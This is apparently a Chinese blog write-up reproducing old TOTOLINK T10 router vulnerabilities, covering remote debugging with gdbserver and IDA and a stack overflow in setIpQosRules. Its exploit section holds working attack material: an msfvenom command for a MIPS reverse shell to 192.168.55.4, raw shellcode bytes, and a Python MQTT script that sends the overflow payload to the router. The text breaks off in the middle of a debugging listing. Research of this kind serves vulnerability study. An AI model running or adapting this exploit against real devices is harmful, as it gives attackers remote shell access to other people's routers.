&lt;h3 id=&#34;7-2-2-运行调试-有符号信息&#34;&gt;&lt;a href=&#34;#7-2-2-运行调试-有符号信息&#34; class=&#34;headerlink&#34; title=&#34;7.2.2 运行调试(有符号信息)&#34;&gt;&lt;/a&gt;7.2.2 运行调试(有符号信息)&lt;/h3&gt;&lt;p&gt;​		先加载二进制文件,main函数处下断点、debugger–process options 设置好ip和端口&lt;/p&gt;
&lt;img src=&#34;/totolinkT10%E8%B7%AF%E7%94%B1%E5%99%A8%E8%80%81%E7%89%88%E6%9C%AC%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E5%92%8C%E5%88%86%E6%9E%90/image-20230508191959853.png&#34; alt=&#34;image-20230508191959853&#34; style=&#34;zoom:33%;&#34;&gt;



&lt;p&gt;被调试那里开启服务,然后debugger-attach to process即可&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;/totolinkT10%E8%B7%AF%E7%94%B1%E5%99%A8%E8%80%81%E7%89%88%E6%9C%AC%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E5%92%8C%E5%88%86%E6%9E%90/image-20230508192153803.png&#34; alt=&#34;image-20230508192153803&#34;&gt;&lt;/p&gt;
&lt;p&gt;​		如果不确定本地的版本和远程的时候一样可以导出二进制文件&lt;/p&gt;
&lt;figure class=&#34;highlight c&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;cat ./cs_broker  | /tmp/busybox-mipsel base64        # 编码过程&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;# 将base64编码的内容保存到本地文件pcap64&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;cat cs | base64 -d &amp;gt; cs_broker         # 解码过程&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;



&lt;p&gt;​		.&amp;#x2F;gdbserver.mipsle :9999 –attach 1335  ida能够成功连接上,但是ida那边运行后,一发送mqtt包就会蹦.. 偶尔能调试成功,能单步走..比较玄学,因为gdb那边调试没用问题,就先用gdb进行调试了&lt;/p&gt;
&lt;figure class=&#34;highlight c&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;15&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;# ./gdbserver.mipsle :&lt;span class=&#34;number&#34;&gt;9999&lt;/span&gt; --attach &lt;span class=&#34;number&#34;&gt;1335&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;Attached; pid = &lt;span class=&#34;number&#34;&gt;1335&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;Listening on port &lt;span class=&#34;number&#34;&gt;9999&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;Remote debugging from host &lt;span class=&#34;number&#34;&gt;192.168&lt;/span&gt;&lt;span class=&#34;number&#34;&gt;.55&lt;/span&gt;&lt;span class=&#34;number&#34;&gt;.3&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;Connection closed by foreign host.&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;# ./gdbserver.mipsle :&lt;span class=&#34;number&#34;&gt;9999&lt;/span&gt; --attach &lt;span class=&#34;number&#34;&gt;1335&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;Attached; pid = &lt;span class=&#34;number&#34;&gt;1335&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;Listening on port &lt;span class=&#34;number&#34;&gt;9999&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;Remote debugging from host &lt;span class=&#34;number&#34;&gt;192.168&lt;/span&gt;&lt;span class=&#34;number&#34;&gt;.55&lt;/span&gt;&lt;span class=&#34;number&#34;&gt;.3&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;ptrace: Input/output error.&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;input_interrupt, count = &lt;span class=&#34;number&#34;&gt;1&lt;/span&gt; c = &lt;span class=&#34;number&#34;&gt;36&lt;/span&gt; (&lt;span class=&#34;string&#34;&gt;&amp;#x27;$&amp;#x27;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;input_interrupt, count = &lt;span class=&#34;number&#34;&gt;1&lt;/span&gt; c = &lt;span class=&#34;number&#34;&gt;36&lt;/span&gt; (&lt;span class=&#34;string&#34;&gt;&amp;#x27;$&amp;#x27;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;input_interrupt, count = &lt;span class=&#34;number&#34;&gt;1&lt;/span&gt; c = &lt;span class=&#34;number&#34;&gt;107&lt;/span&gt; (&lt;span class=&#34;string&#34;&gt;&amp;#x27;k&amp;#x27;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;



&lt;p&gt;好像和二进制文件有关?&lt;/p&gt;
&lt;figure class=&#34;highlight c&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;The current debugger &lt;span class=&#34;title function_&#34;&gt;backend&lt;/span&gt; &lt;span class=&#34;params&#34;&gt;(gdb)&lt;/span&gt; does not provide memory information to IDA.&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;Therefore the memory contents may be invisible by &lt;span class=&#34;keyword&#34;&gt;default&lt;/span&gt;.&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;Please use the Debugger/Manual memory regions menu item to configure the memory layout.&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;It is possible to define just one big region &lt;span class=&#34;keyword&#34;&gt;for&lt;/span&gt; the whole &lt;span class=&#34;title function_&#34;&gt;memory&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;params&#34;&gt;(IDA will display question marks &lt;span class=&#34;keyword&#34;&gt;for&lt;/span&gt; missing memory regions in this &lt;span class=&#34;keyword&#34;&gt;case&lt;/span&gt;)&lt;/span&gt;.&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;



&lt;h2 id=&#34;7-3-filewall-so库中setIpQosRules函数栈溢出调试&#34;&gt;&lt;a href=&#34;#7-3-filewall-so库中setIpQosRules函数栈溢出调试&#34; class=&#34;headerlink&#34; title=&#34;7.3 filewall.so库中setIpQosRules函数栈溢出调试&#34;&gt;&lt;/a&gt;7.3 filewall.so库中setIpQosRules函数栈溢出调试&lt;/h2&gt;&lt;figure class=&#34;highlight c&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;15&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;type&#34;&gt;int&lt;/span&gt; __fastcall &lt;span class=&#34;title function_&#34;&gt;setIpQosRules&lt;/span&gt;&lt;span class=&#34;params&#34;&gt;(&lt;span class=&#34;type&#34;&gt;int&lt;/span&gt; a1, &lt;span class=&#34;type&#34;&gt;int&lt;/span&gt; a2, &lt;span class=&#34;type&#34;&gt;int&lt;/span&gt; a3)&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  ......&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;span class=&#34;type&#34;&gt;char&lt;/span&gt; v14[&lt;span class=&#34;number&#34;&gt;23&lt;/span&gt;]; &lt;span class=&#34;comment&#34;&gt;// [sp+18h] [-B8h] BYREF&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  ......&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  v12 = (&lt;span class=&#34;type&#34;&gt;const&lt;/span&gt; &lt;span class=&#34;type&#34;&gt;char&lt;/span&gt; *)websGetVar(a2, &lt;span class=&#34;string&#34;&gt;&amp;quot;comment&amp;quot;&lt;/span&gt;, &amp;amp;byte_9268);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	......&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;span class=&#34;built_in&#34;&gt;strcpy&lt;/span&gt;(v14, v12);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  apmib_set(&lt;span class=&#34;number&#34;&gt;131385&lt;/span&gt;, v14);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  apmib_set(&lt;span class=&#34;number&#34;&gt;65848&lt;/span&gt;, v14);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  apmib_update_web(&lt;span class=&#34;number&#34;&gt;4&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  system(&lt;span class=&#34;string&#34;&gt;&amp;quot;sysconf firewall&amp;quot;&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  websSetCfgResponse(a1, a3, &lt;span class=&#34;string&#34;&gt;&amp;quot;0&amp;quot;&lt;/span&gt;, &lt;span class=&#34;string&#34;&gt;&amp;quot;reserv&amp;quot;&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;span class=&#34;keyword&#34;&gt;return&lt;/span&gt; &lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;

&lt;p&gt;​		comment明显存在溢出,复制给栈上数据v14&lt;/p&gt;
&lt;h4 id=&#34;7-3-1-利用脚本&#34;&gt;&lt;a href=&#34;#7-3-1-利用脚本&#34; class=&#34;headerlink&#34; title=&#34;7.3.1 利用脚本&#34;&gt;&lt;/a&gt;7.3.1 利用脚本&lt;/h4&gt;&lt;p&gt;生成反弹shell payload:msfvenom -p linux&amp;#x2F;mipsle&amp;#x2F;shell_reverse_tcp LHOST&amp;#x3D;192.168.55.4 LPORT&amp;#x3D;9999 -f py -o mips.txt&lt;/p&gt;
&lt;figure class=&#34;highlight python&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;18&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;19&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;20&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;21&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;22&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;23&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;24&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;25&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;from&lt;/span&gt; pwn &lt;span class=&#34;keyword&#34;&gt;import&lt;/span&gt; *&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;import&lt;/span&gt; paho.mqtt.client &lt;span class=&#34;keyword&#34;&gt;as&lt;/span&gt; mqtt&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;buf = &lt;span class=&#34;string&#34;&gt;&amp;quot;\xfa\xff\x0f\x24\x27\x78\xe0\x01\xfd\xff\xe4\x21&amp;quot;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;buf += &lt;span class=&#34;string&#34;&gt;&amp;quot;\xfd\xff\xe5\x21\xff\xff\x06\x28\x57\x10\x02\x24&amp;quot;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;buf += &lt;span class=&#34;string&#34;&gt;&amp;quot;\x0c\x01\x01\x01\xff\xff\xa2\xaf\xff\xff\xa4\x8f&amp;quot;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;buf += &lt;span class=&#34;string&#34;&gt;&amp;quot;\xfd\xff\x0f\x34\x27\x78\xe0\x01\xe2\xff\xaf\xaf&amp;quot;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;buf += &lt;span class=&#34;string&#34;&gt;&amp;quot;\x27\x0f\x0e\x3c\x27\x0f\xce\x35\xe4\xff\xae\xaf&amp;quot;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;buf += &lt;span class=&#34;string&#34;&gt;&amp;quot;\x37\x02\x0e\x3c\xc0\xa8\xce\x35\xe6\xff\xae\xaf&amp;quot;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;buf += &lt;span class=&#34;string&#34;&gt;&amp;quot;\xe2\xff\xa5\x27\xef\xff\x0c\x24\x27\x30\x80\x01&amp;quot;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;buf += &lt;span class=&#34;string&#34;&gt;&amp;quot;\x4a\x10\x02\x24\x0c\x01\x01\x01\xfd\xff\x11\x24&amp;quot;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;buf += &lt;span class=&#34;string&#34;&gt;&amp;quot;\x27\x88\x20\x02\xff\xff\xa4\x8f\x21\x28\x20\x02&amp;quot;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;buf += &lt;span class=&#34;string&#34;&gt;&amp;quot;\xdf\x0f\x02\x24\x0c\x01\x01\x01\xff\xff\x10\x24&amp;quot;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;buf += &lt;span class=&#34;string&#34;&gt;&amp;quot;\xff\xff\x31\x22\xfa\xff\x30\x16\xff\xff\x06\x28&amp;quot;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;buf += &lt;span class=&#34;string&#34;&gt;&amp;quot;\x62\x69\x0f\x3c\x2f\x2f\xef\x35\xec\xff\xaf\xaf&amp;quot;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;buf += &lt;span class=&#34;string&#34;&gt;&amp;quot;\x73\x68\x0e\x3c\x6e\x2f\xce\x35\xf0\xff\xae\xaf&amp;quot;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;buf += &lt;span class=&#34;string&#34;&gt;&amp;quot;\xf4\xff\xa0\xaf\xec\xff\xa4\x27\xf8\xff\xa4\xaf&amp;quot;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;buf += &lt;span class=&#34;string&#34;&gt;&amp;quot;\xfc\xff\xa0\xaf\xf8\xff\xa5\x27\xab\x0f\x02\x24&amp;quot;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;buf += &lt;span class=&#34;string&#34;&gt;&amp;quot;\x0c\x01\x01\x01&amp;quot;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;test = &lt;span class=&#34;string&#34;&gt;&amp;quot;a&amp;quot;&lt;/span&gt;*&lt;span class=&#34;number&#34;&gt;218&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;client = mqtt.Client()&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;client.connect(&lt;span class=&#34;string&#34;&gt;&amp;quot;192.168.55.1&amp;quot;&lt;/span&gt;,&lt;span class=&#34;number&#34;&gt;1883&lt;/span&gt;,&lt;span class=&#34;number&#34;&gt;60&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;client.publish(&lt;span class=&#34;string&#34;&gt;&amp;#x27;totolink/router/setting/setIpQosRules&amp;#x27;&lt;/span&gt;,payload=&lt;span class=&#34;string&#34;&gt;&amp;#x27;&amp;#123;&amp;quot;topicurl&amp;quot;:&amp;quot;setting/setIpQosRules&amp;quot;,&amp;quot;comment&amp;quot;:&amp;quot;xx&amp;#x27;&lt;/span&gt;+test+&lt;span class=&#34;string&#34;&gt;&amp;#x27;\xb4\x43\x41&amp;quot;&amp;#125;&amp;#x27;&lt;/span&gt;+&lt;span class=&#34;string&#34;&gt;&amp;#x27;bling&amp;#x27;&lt;/span&gt;+buf)&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;

&lt;p&gt;​		偏移量具体多少可以在调试的时候查看&lt;/p&gt;
&lt;h4 id=&#34;7-3-2-调试案例&#34;&gt;&lt;a href=&#34;#7-3-2-调试案例&#34; class=&#34;headerlink&#34; title=&#34;7.3.2 调试案例&#34;&gt;&lt;/a&gt;7.3.2 调试案例&lt;/h4&gt;&lt;figure class=&#34;highlight c&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;18&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;19&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;20&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;21&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;22&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;23&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;24&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;25&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;26&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;27&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;28&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;29&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;30&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;31&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;32&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;33&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;34&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;35&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;36&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;37&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;38&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;39&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;40&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;41&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;路由器上&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;# ./gdbserver.mipsle :&lt;span class=&#34;number&#34;&gt;9999&lt;/span&gt; --attach &lt;span class=&#34;number&#34;&gt;14725&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;Attached; pid = &lt;span class=&#34;number&#34;&gt;14725&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;Listening on port &lt;span class=&#34;number&#34;&gt;9999&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;调试机器&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;target remote &lt;span class=&#34;number&#34;&gt;192.168&lt;/span&gt;&lt;span class=&#34;number&#34;&gt;.55&lt;/span&gt;&lt;span class=&#34;number&#34;&gt;.1&lt;/span&gt;:&lt;span class=&#34;number&#34;&gt;9999&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;   &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;vmmap&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;例如查到firewall.so的基地址是&lt;span class=&#34;number&#34;&gt;0x778ec000&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;.text:&lt;span class=&#34;number&#34;&gt;00003414&lt;/span&gt;                 la      $t9, &lt;span class=&#34;built_in&#34;&gt;strcpy&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;.text:&lt;span class=&#34;number&#34;&gt;00003418&lt;/span&gt;                 jalr    $t9 ; &lt;span class=&#34;built_in&#34;&gt;strcpy&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;.text:&lt;span class=&#34;number&#34;&gt;0000341&lt;/span&gt;C                 move    $a1, $s1         &lt;span class=&#34;meta&#34;&gt;# src&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;.text:&lt;span class=&#34;number&#34;&gt;00003420&lt;/span&gt;                 lw      $gp, &lt;span class=&#34;number&#34;&gt;0xD0&lt;/span&gt;+var_C0($sp)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;.text:&lt;span class=&#34;number&#34;&gt;00003424&lt;/span&gt;                 li      $a0, &lt;span class=&#34;number&#34;&gt;0x20139&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span 